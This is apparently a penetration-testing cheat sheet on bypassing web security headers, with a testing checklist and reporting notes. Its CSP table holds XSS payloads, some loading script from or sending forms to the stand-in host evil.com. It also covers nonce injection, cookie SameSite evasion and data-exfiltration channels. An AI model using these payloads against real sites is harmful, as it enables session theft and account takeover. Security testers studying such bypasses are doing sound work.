# Security Headers — Bypass Techniques

Security headers are guardrails, not walls. This file is how to **defeat** each one so a downstream bug (XSS, clickjacking, MIME sniff) still lands. Read the target's headers first: `curl -sI https://target.com`.

---

## CSP (Content-Security-Policy) — the big one
A CSP blocks XSS only if it is tight. Find the weak directive, then use the matching gadget.

### Weakness → payload
| CSP weakness | Bypass payload |
|---|---|
| `script-src 'unsafe-inline'` | `"/><script>alert(document.domain)</script>` |
| `script-src 'unsafe-eval'` | feed attacker string into `eval`/`setTimeout`/`Function` sink |
| `script-src *` / wildcard | `"><script src=https://evil.com/x.js></script>` |
| `data:` in script-src | `<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>` |
| missing `object-src`/`default-src` | `<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>` |
| whitelisted domain hosts **JSONP** | `<script src="https://www.google.com/complete/search?client=chrome&q=x&callback=alert#1"></script>` |
| whitelisted domain runs **AngularJS** | `<div ng-app ng-csp><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">` (version-specific gadget) |
| whitelisted domain has **open redirect** | `<script src="https://trusted.com/redirect?url=https://evil.com/x.js"></script>` |
| `script-src 'self'` + **file upload** | upload JS as `pic.png.js`, then `<script src="/uploads/pic.png.js"></script>` |
| missing `base-uri` | `<base href="https://evil.com/">` → hijacks relative `<script src>` and nonce reuse |
| missing `form-action` | point a form at `evil.com` to steal submitted creds/tokens |
| `strict-dynamic` + a gadget that injects a script node | ride the trusted script to spawn yours |
| iframe allowed | `<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>` |

### Nonce-based CSP bypasses
- **Nonce reflected in a cookie/param** (Zoom-class): if the app echoes an attacker-controlled value into the `nonce`, inject your own:
```
Cookie: _zm_csp_script_nonce="x' 'nonce-x' >alert(1)// "
```
Reflected into ~40 inline scripts → your `nonce-x` script executes. See `04-auth-session/07-session-hijacking.md`.
- **base-uri missing + nonce**: `<base>` + a `<script nonce=...>` you control, or dangling-markup to leak the nonce then reuse it.
- Predictable/reused nonce across responses → reuse it.

### CSP exfil when script is fully blocked
Dangling-markup / CSS injection to leak tokens even under strict CSP — see `09-advanced/05-dangling-markup-and-css-injection.md`.

### Server-side CSP-strip tricks
- **PHP response-buffer**: PHP buffers ~4096 bytes; if you can flood warnings before the CSP header is set, the header may be dropped.
- CSP only on some routes (missing on error pages, legacy paths, file endpoints) → deliver XSS there.
- `Content-Security-Policy-Report-Only` = **not enforced**. Free XSS.
- CSP in a `<meta>` tag can be neutralized by injecting *before* it or via dangling markup.

### Tools
`csp-evaluator` (Google), `CSP Auditor` (Burp), check `script-src`/`object-src`/`base-uri` first.

---

## X-Frame-Options / frame-ancestors → clickjacking
- Missing or `ALLOW-FROM` (deprecated, ignored by Chrome) → framable.
- `frame-ancestors 'self'` but a subdomain XSS/takeover → frame from there.
- **Double-clickjacking** bypasses XFO **and** `frame-ancestors` entirely (no iframe — uses popups). See `05-client-side/03-clickjacking.md`.

---

## X-Content-Type-Options (nosniff)
- **Missing** → browser MIME-sniffs. Upload/serve text as HTML → stored XSS (see `06-file-upload/02`).
- Response with wrong/empty `Content-Type` + no `nosniff` → sniffed to HTML/JS.

---

## HSTS (Strict-Transport-Security)
- Missing / no `includeSubDomains` / no preload → SSL-strip / MITM on first visit, cookie theft over HTTP on a subdomain.
- Report as an enabler for network-position attacks (usually info unless you show impact).

---

## CORS (Access-Control-Allow-Origin) — see `05-client-side/02-cors.md`
- Reflected `Origin` + `Allow-Credentials: true` = read authenticated data cross-origin.
- `null` origin trust (sandboxed iframe), weak regex (`target.com.evil.com`).

---

## Cookie flags
- Missing `HttpOnly` → JS reads cookie → XSS steals session.
- Missing `Secure` → cookie over HTTP.
- `SameSite=None`/missing → CSRF cross-site (see `05-client-side/01`).
- **Defeating `SameSite=Lax`** (default when unset): use a top-level **GET** (Lax still sends the cookie on navigation) — target any state-changing GET or a framework `_method=GET`/`_method=POST` override; the **~120s window** where Chrome doesn't enforce Lax on top-level POST right after the cookie is issued (force a refresh via the OAuth/login flow); an **on-site redirect gadget** (open redirect on the same domain makes the final request same-site); or a **sibling-subdomain** flaw to inject/toss cookies cross-subdomain. Trigger via `window.open()`/top-level nav, not `fetch`.
- `Domain=.target.com` too broad → **cookie tossing** from a subdomain overrides parent cookies (see `04-auth-session/07`).
- Not `__Host-`/`__Secure-` prefixed → subdomain can overwrite.

---

## Referrer-Policy
- `unsafe-url` / missing → full URL (with tokens in query) leaks to third parties in `Referer`. Chains to reset-token/OAuth-code theft.

---

## COOP / COEP / CORP
- Missing COOP → cross-window `window.opener` access (reverse tabnabbing, XS-Leaks, double-clickjacking popup control).
- Missing CORP → your page embeds their resources for XS-Leaks / timing.

---

## 🎯 Enumerate first — Request → Response
```http
GET / HTTP/2
Host: target.com
```
```http
HTTP/2 200 OK
Content-Security-Policy: script-src 'self' *.googleapis.com 'unsafe-inline'; object-src 'none'
X-Frame-Options: SAMEORIGIN
# no Strict-Transport-Security, no X-Content-Type-Options, no Referrer-Policy
Set-Cookie: session=...; Secure; HttpOnly           # no SameSite → CSRF surface
```
Read it: `'unsafe-inline'` in `script-src` → inline XSS lands; missing `nosniff` → upload/MIME-sniff XSS; missing `SameSite` → CSRF; XFO set but double-clickjacking still works.

## Method
- [ ] `curl -sI` the target, list every present + **absent** security header.
- [ ] For each present header, find the loosest directive and match the gadget above.
- [ ] For each absent header, note which downstream bug it re-enables.
- [ ] Chain: weak CSP + reflected input = XSS; missing XFO + sensitive action = clickjacking; broad cookie domain + subdomain XSS = full-domain takeover.

## Report notes
A missing header alone is usually **informational**. It becomes a real finding when you show the exploit it enables (fired XSS under the "CSP-protected" page, framed sensitive action, cross-origin data read). Always demonstrate impact, not just the missing header.

## Deep cuts — modern CSP internals & exfil
- [ ] **`strict-dynamic` reality:** it ignores host/allowlist and trusts nonce/hash-loaded scripts to spawn children — so a nonce leak or an injection point *inside* an already-trusted script still wins; and a **DOM-clobbering/prototype-pollution gadget** that creates a `<script>` node inherits trust (`05-client-side/08`, `09-advanced/02`).
- [ ] **CSP exfil channels when script runs but `connect-src` is tight:** DNS-prefetch (`<link rel=dns-prefetch href=//DATA.collab>`), `navigator.sendBeacon` to an allowed host, `<img>`/CSS `background:url()` to an allowed/`data:` host, WebRTC, `report-uri`/`report-to` (a CSP violation you *cause* posts the blocked URL to the report endpoint — smuggle data in the path).
- [ ] **`Trusted Types` bypass:** find a policy that returns input unchanged, an `unsafe` default policy, or a DOM sink not covered by `require-trusted-types-for 'script'`.
- [ ] **CSP delivered via `Link:`/`<meta>`:** a `<meta http-equiv=CSP>` can be neutralized by injecting content *before* it (dangling markup), and header-vs-meta precedence differs.
- [ ] **`wasm-unsafe-eval`/`unsafe-hashes`** present → specific eval-ish gadgets return.
- [ ] **Nonce leakage via cache:** a per-request nonce cached and reused across users (`Vary` missing) = predictable nonce → inject `<script nonce=...>` (`08-infra/03`).
- [ ] **Permissions-Policy gaps:** missing/loose `camera`/`microphone`/`geolocation`/`payment` lets a framed or XSS'd context abuse pre-granted permissions (`04-auth-session/07` permission hijack).
- [ ] **Header injection to *set* a permissive CSP/CORS** (CRLF, `03-injection/07`) — you control the guard itself.

## Sources
- HackTricks CSP Bypass; bhaveshk90 CSP-Bypass-Techniques (GitHub); Vaadata CSP bypass blog; Intigriti CSP bypass guide; PortSwigger Trusted Types / CSP research.
